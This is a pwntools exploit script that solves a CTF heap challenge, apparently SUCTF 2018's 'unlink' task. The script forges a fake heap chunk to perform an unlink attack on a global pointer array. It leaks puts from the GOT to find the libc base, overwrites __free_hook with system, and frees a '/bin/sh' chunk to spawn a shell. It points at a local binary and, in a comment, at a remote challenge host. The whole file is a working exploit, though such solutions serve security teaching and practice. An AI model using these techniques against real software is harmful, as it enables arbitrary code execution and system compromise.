from pwn import *

io = process("./service")
# io = remote("node4.anna.nssctf.cn", 20131)
elf = ELF("./service")
libc = ELF("./libc-2.23.so")


def touch(size):
    io.recvuntil(b"please chooice :\n")
    io.sendline(str(1).encode())
    io.recvuntil(b"please input the size : \n")
    io.sendline(str(size).encode())


def delete(index):
    io.recvuntil(b"please chooice :\n")
    io.sendline(str(2).encode())
    io.recvuntil(b"which node do you want to delete\n")
    io.sendline(str(index).encode())


def show(index):
    io.recvuntil(b"please chooice :\n")
    io.sendline(str(3).encode())
    io.recvuntil(b"show")
    io.sendline(str(index).encode())
    io.recvuntil(b"is : ")


def take_note(index, content):
    io.sendlineafter(b"chooice :\n", b"4")
    io.sendlineafter(b"modify :\n", str(index).encode())
    io.sendafter(b"content\n", content)


def gdb_debug():
    gdb.attach(
        io,
        gdbscript="""
    set debug-file-directory /data/project/ctf-repo/pwn/nssctf/SUCTF_2018_招新赛-unlink/debug/
    nosharedlibrary
    sharedlibrary
    b menu
               """,
    )


buf_bss = 0x6020C0

touch(0x20)  # 0
print("touch 0")
touch(0x80)  # 1
print("touch 1")
touch(0x100)  # 2
print("touch 2")

payload = (
    p64(0) # prev_size
    + p64(0x20) # chunk_size
    + p64(buf_bss - 0x18) # fd
    + p64(buf_bss - 0x10) # bk
    + p64(0x20) # prev_size(overwrite chunk 1)
    + p64(0x90) # chunk_size(overwrite chunk 2)
)
take_note(0, payload)
print("take node")
delete(1)
print("delete 1")

# ============

payload = p64(0) * 3 + p64(0x6020C8)
take_note(0, payload)
print("take node")
gdb_debug()


payload = p64(elf.got["puts"])
take_note(0, payload)
print("take node")
show(1)
print("show 1")
io.recvuntil(b"\n")
puts_addr = u64(io.recv(6).ljust(8, b"\x00"))
print("puts address =", hex(puts_addr))
libc_base = puts_addr - libc.sym["puts"]
print("libc base address =", hex(libc_base))

free_hook = libc_base + libc.sym["__free_hook"]
bin_sh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))
system_addr = libc_base + libc.sym["system"]
payload = p64(free_hook) + p64(bin_sh_addr)

take_note(0, payload)
take_note(1, p64(system_addr))
delete(2)  # 触发 free(2) free_hook 已经被改写成 system 了


io.interactive()
